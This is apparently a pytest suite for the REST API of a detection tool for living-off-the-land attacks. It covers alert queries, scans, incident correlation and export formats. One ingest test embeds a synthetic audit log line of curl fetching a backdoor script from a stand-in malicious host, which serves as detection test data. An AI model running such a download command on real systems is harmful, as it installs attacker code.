"""
Tests for REST API server
"""
import pytest
import tempfile
import os
from datetime import datetime
from pathlib import Path
from api.server import create_app
from core.database import AlertDatabase
from core.engine import Alert
from collectors.base import Event


@pytest.fixture
def temp_db():
    """Create a temporary database for testing"""
    with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as f:
        db_path = f.name

    yield db_path

    # Cleanup
    if os.path.exists(db_path):
        os.unlink(db_path)


@pytest.fixture
def app(temp_db):
    """Create Flask app with test configuration"""
    config = {
        'DATABASE_PATH': temp_db,
        'RULES_DIR': 'rules',
        'TESTING': True,
        'LOG_LEVEL': 'ERROR'  # Suppress logs during tests
    }

    app = create_app(config)
    return app


@pytest.fixture
def client(app):
    """Create Flask test client"""
    return app.test_client()


@pytest.fixture
def sample_alerts(temp_db):
    """Create sample alerts in the database"""
    db = AlertDatabase(temp_db)

    # Create sample events and alerts
    alerts = []
    for i in range(5):
        event = Event(
            timestamp=datetime.now(),
            platform='windows' if i % 2 == 0 else 'linux',
            process_name=f'process{i}.exe',
            command_line=f'command {i}',
            user='testuser',
            process_id=1000 + i
        )

        alert = Alert(
            rule_id=f'WIN-{i:03d}',
            rule_name=f'Test Rule {i}',
            severity=['low', 'medium', 'high', 'critical'][i % 4],
            event=event,
            timestamp=event.timestamp,
            mitre_attack=['T1059'],
            description='Test alert',
            response=['Test response'],
            score=25 + (i * 30)
        )

        alert_id = db.save_alert(alert)
        alerts.append(alert_id)

    db.close()
    return alerts


def test_health_check(client):
    """Test health check endpoint returns minimal public info"""
    response = client.get('/api/health')
    assert response.status_code == 200

    data = response.get_json()
    assert data['status'] == 'ok'
    # Health check should NOT expose internal details without auth
    assert 'database' not in data
    assert 'rules_loaded' not in data


def test_get_alerts(client, sample_alerts):
    """Test getting all alerts"""
    response = client.get('/api/alerts')
    assert response.status_code == 200

    data = response.get_json()
    assert 'count' in data
    assert 'alerts' in data
    assert data['count'] == 5


def test_get_alerts_with_limit(client, sample_alerts):
    """Test getting alerts with limit parameter"""
    response = client.get('/api/alerts?limit=2')
    assert response.status_code == 200

    data = response.get_json()
    assert data['count'] == 2


def test_get_alerts_by_severity(client, sample_alerts):
    """Test filtering alerts by severity"""
    response = client.get('/api/alerts?severity=high')
    assert response.status_code == 200

    data = response.get_json()
    assert 'alerts' in data
    # Should have at least one high severity alert
    if data['count'] > 0:
        assert all(a['severity'] == 'high' for a in data['alerts'])


def test_get_alerts_by_platform(client, sample_alerts):
    """Test filtering alerts by platform"""
    response = client.get('/api/alerts?platform=windows')
    assert response.status_code == 200

    data = response.get_json()
    if data['count'] > 0:
        assert all(a['platform'] == 'windows' for a in data['alerts'])


def test_get_alerts_by_min_score(client, sample_alerts):
    """Test filtering alerts by minimum score"""
    response = client.get('/api/alerts?min_score=100')
    assert response.status_code == 200

    data = response.get_json()
    if data['count'] > 0:
        assert all(a['score'] >= 100 for a in data['alerts'])


def test_get_single_alert(client, sample_alerts):
    """Test getting a single alert by ID"""
    alert_id = sample_alerts[0]

    response = client.get(f'/api/alerts/{alert_id}')
    assert response.status_code == 200

    data = response.get_json()
    assert data['id'] == alert_id


def test_get_nonexistent_alert(client):
    """Test getting an alert that doesn't exist"""
    response = client.get('/api/alerts/99999')
    assert response.status_code == 404

    data = response.get_json()
    assert 'error' in data


def test_get_stats(client, sample_alerts):
    """Test getting statistics"""
    response = client.get('/api/stats')
    assert response.status_code == 200

    data = response.get_json()
    assert 'alerts' in data
    assert 'rules' in data

    # Check alert stats
    assert data['alerts']['total_alerts'] == 5

    # Check rule stats
    assert 'total_rules' in data['rules']


def test_get_rules(client):
    """Test getting all detection rules"""
    response = client.get('/api/rules')
    assert response.status_code == 200

    data = response.get_json()
    assert 'count' in data
    assert 'rules' in data
    assert 'stats' in data

    # Should have loaded rules from rules directory
    assert data['count'] > 0

    # Check stats structure
    assert 'total' in data['stats']
    assert 'by_platform' in data['stats']
    assert 'by_severity' in data['stats']


def test_scan_missing_body(client):
    """Test scan endpoint with missing request body"""
    response = client.post('/api/scan', json={})
    assert response.status_code == 400

    data = response.get_json()
    assert 'error' in data


def test_scan_missing_platform(client):
    """Test scan endpoint with missing platform"""
    response = client.post('/api/scan', json={'log_path': '/tmp/test'})
    assert response.status_code == 400

    data = response.get_json()
    assert 'error' in data


def test_scan_missing_log_path(client):
    """Test scan endpoint with missing log_path"""
    response = client.post('/api/scan', json={'platform': 'windows'})
    assert response.status_code == 400

    data = response.get_json()
    assert 'error' in data


def test_scan_invalid_platform(client):
    """Test scan endpoint with invalid platform"""
    response = client.post('/api/scan', json={
        'platform': 'invalid',
        'log_path': '/tmp/test'
    })
    assert response.status_code == 400

    data = response.get_json()
    assert 'error' in data


def test_scan_nonexistent_path(client):
    """Test scan endpoint with nonexistent log path"""
    response = client.post('/api/scan', json={
        'platform': 'windows',
        'log_path': '/nonexistent/path'
    })
    assert response.status_code == 400

    data = response.get_json()
    assert 'error' in data


def test_scan_valid_request(client):
    """Test scan endpoint with valid request"""
    # Use an existing test fixture directory
    log_path = 'tests/fixtures/windows'

    response = client.post('/api/scan', json={
        'platform': 'windows',
        'log_path': log_path
    })

    # Should succeed or fail gracefully
    assert response.status_code in [200, 400, 500]

    if response.status_code == 200:
        data = response.get_json()
        assert 'events_processed' in data
        assert 'alerts_generated' in data
        assert 'results' in data


def test_scan_linux_logs(client):
    """Test scanning Linux logs"""
    # Use Linux fixture
    log_path = 'tests/fixtures/linux/malicious_curl.log'

    if os.path.exists(log_path):
        response = client.post('/api/scan', json={
            'platform': 'linux',
            'log_path': log_path
        })

        assert response.status_code == 200
        data = response.get_json()
        assert data['events_processed'] >= 0
        assert 'alerts_generated' in data


def test_scan_macos_ndjson(client):
    """Scan endpoint accepts macOS eslogger NDJSON and generates alerts"""
    response = client.post('/api/scan', json={
        'platform': 'macos',
        'log_path': 'tests/fixtures/macos/malicious_mac004_spctl_disable.ndjson'
    })
    assert response.status_code == 200
    data = response.get_json()
    assert data['events_processed'] == 1
    assert data['alerts_generated'] >= 1


def test_scan_returns_incidents(client):
    """Test that scan runs correlation and reports incidents"""
    response = client.post('/api/scan', json={
        'platform': 'windows',
        'log_path': 'tests/fixtures/windows'
    })

    assert response.status_code == 200
    data = response.get_json()
    assert 'incidents_generated' in data
    assert 'incident_results' in data
    # The bundled Windows fixtures contain an Office to encoded
    # PowerShell chain, so at least one incident must correlate.
    assert data['incidents_generated'] >= 1
    chain_ids = {r['chain_id'] for r in data['incident_results']}
    assert 'CHAIN-WIN-001' in chain_ids

    # Rescanning the same fixture must deduplicate, not duplicate
    rescan = client.post('/api/scan', json={
        'platform': 'windows',
        'log_path': 'tests/fixtures/windows'
    })
    assert rescan.status_code == 200
    assert rescan.get_json()['incidents_generated'] == 0


def test_get_incidents_endpoint(client):
    """Test incidents endpoint with filters"""
    # Empty before any scan
    response = client.get('/api/incidents')
    assert response.status_code == 200
    assert response.get_json()['count'] == 0

    client.post('/api/scan', json={
        'platform': 'windows',
        'log_path': 'tests/fixtures/windows'
    })

    response = client.get('/api/incidents')
    data = response.get_json()
    assert data['count'] >= 1
    incident = data['incidents'][0]
    assert incident['chain_id'].startswith('CHAIN-')
    assert isinstance(incident['stages'], list)
    assert incident['risk_band'] in ('low', 'medium', 'high', 'critical')

    filtered = client.get('/api/incidents?chain_id=CHAIN-LNX-001')
    assert filtered.get_json()['count'] == 0

    filtered = client.get('/api/incidents?min_score=999')
    assert filtered.get_json()['count'] == 0


def test_ingest_incremental(client):
    """Incremental ingest processes only new content across calls"""
    import tempfile
    event = (
        'type=SYSCALL msg=audit(1642253400.1:1001): arch=c000003e syscall=59 '
        'success=yes exit=0 ppid=1234 pid=5678 auid=1000 uid=1000 gid=1000 '
        'euid=1000 tty=pts0 ses=1 comm="curl" exe="/usr/bin/curl" key=(null)\n'
        'type=EXECVE msg=audit(1642253400.1:1001): argc=3 a0="curl" a1="-s" '
        'a2="http://malicious-site.com/backdoor.sh"\n'
    )
    with tempfile.NamedTemporaryFile(suffix=".log", delete=False, mode="w") as f:
        path = f.name
        f.write(event)
    try:
        first = client.post('/api/ingest', json={'platform': 'linux', 'log_path': path})
        assert first.status_code == 200
        data = first.get_json()
        assert data['events_processed'] == 1
        assert data['alerts_new'] == 1

        # Re-ingest with no new content is a no-op
        second = client.post('/api/ingest', json={'platform': 'linux', 'log_path': path})
        assert second.get_json()['events_processed'] == 0
    finally:
        os.unlink(path)


def test_ingest_rejects_unknown_platform(client):
    """Incremental ingest rejects platforms other than linux/windows/macos"""
    response = client.post('/api/ingest', json={
        'platform': 'freebsd', 'log_path': 'tests/fixtures/linux'
    })
    assert response.status_code == 400


def test_ingest_macos_ndjson(client):
    """Incremental ingest tails a macOS eslogger NDJSON source"""
    response = client.post('/api/ingest', json={
        'platform': 'macos',
        'log_path': 'tests/fixtures/macos/malicious_mac004_spctl_disable.ndjson'
    })
    assert response.status_code == 200
    data = response.get_json()
    assert data['events_processed'] == 1
    assert data['alerts_new'] == 1


def test_ingest_windows_xml(client):
    """Incremental ingest tails a Windows Sysmon XML source"""
    response = client.post('/api/ingest', json={
        'platform': 'windows',
        'log_path': 'tests/fixtures/windows/malicious_win007_powershell_cradle.xml'
    })
    assert response.status_code == 200
    data = response.get_json()
    assert data['events_processed'] == 1
    assert data['alerts_new'] == 1


def test_export_alerts_json(client):
    """Export alerts as ECS JSON lines"""
    client.post('/api/scan', json={
        'platform': 'windows', 'log_path': 'tests/fixtures/windows'
    })
    response = client.get('/api/export?kind=alerts&format=json')
    assert response.status_code == 200
    assert response.mimetype == 'text/plain'
    body = response.get_data(as_text=True).strip()
    if body:
        import json as _json
        first = _json.loads(body.splitlines()[0])
        assert 'rule' in first
        assert first['observer']['vendor'] == 'LOTL Detector'


def test_export_incidents_cef(client):
    """Export incidents as CEF lines"""
    client.post('/api/scan', json={
        'platform': 'windows', 'log_path': 'tests/fixtures/windows'
    })
    response = client.get('/api/export?kind=incidents&format=cef')
    assert response.status_code == 200
    body = response.get_data(as_text=True).strip()
    if body:
        assert body.splitlines()[0].startswith('CEF:0|LOTL Detector|')


def test_export_invalid_format(client):
    """Unknown export format returns 400"""
    response = client.get('/api/export?format=leef')
    assert response.status_code == 400


def test_invalid_time_format(client):
    """Test alerts endpoint with invalid time format"""
    response = client.get('/api/alerts?start_time=invalid-date')
    assert response.status_code == 400

    data = response.get_json()
    assert 'error' in data


def test_cors_headers(client):
    """Test that CORS headers are NOT present when no origins are configured"""
    response = client.get('/api/health')
    assert response.status_code == 200

    # With default config (no CORS origins), no CORS headers should be present
    assert 'Access-Control-Allow-Origin' not in response.headers


def test_404_for_unknown_route(client):
    """Test 404 for unknown routes"""
    response = client.get('/api/unknown')
    assert response.status_code == 404

    data = response.get_json()
    assert 'error' in data


def test_method_not_allowed(client):
    """Test method not allowed responses"""
    # Health check only supports GET
    response = client.post('/api/health')
    assert response.status_code == 405  # Method Not Allowed


def test_get_alerts_json_format(client, sample_alerts):
    """Test that alerts are returned in correct JSON format"""
    response = client.get('/api/alerts')
    assert response.status_code == 200
    assert response.content_type == 'application/json'

    data = response.get_json()
    assert isinstance(data, dict)
    assert isinstance(data['alerts'], list)


def test_stats_structure(client, sample_alerts):
    """Test that stats have the correct structure"""
    response = client.get('/api/stats')
    assert response.status_code == 200

    data = response.get_json()

    # Check alerts stats structure
    assert 'total_alerts' in data['alerts']
    assert 'by_severity' in data['alerts']
    assert 'by_platform' in data['alerts']
    assert 'score_distribution' in data['alerts']
    assert 'alerts_last_24h' in data['alerts']

    # Check rules stats structure
    assert 'total_rules' in data['rules']
    assert 'by_severity' in data['rules']
    assert 'by_platform' in data['rules']


def test_rules_format(client):
    """Test that rules are returned in correct format"""
    response = client.get('/api/rules')
    assert response.status_code == 200

    data = response.get_json()
    if data['count'] > 0:
        # Check first rule structure
        rule = data['rules'][0]
        assert 'id' in rule
        assert 'name' in rule
        assert 'platform' in rule
        assert 'severity' in rule
        assert 'detection' in rule
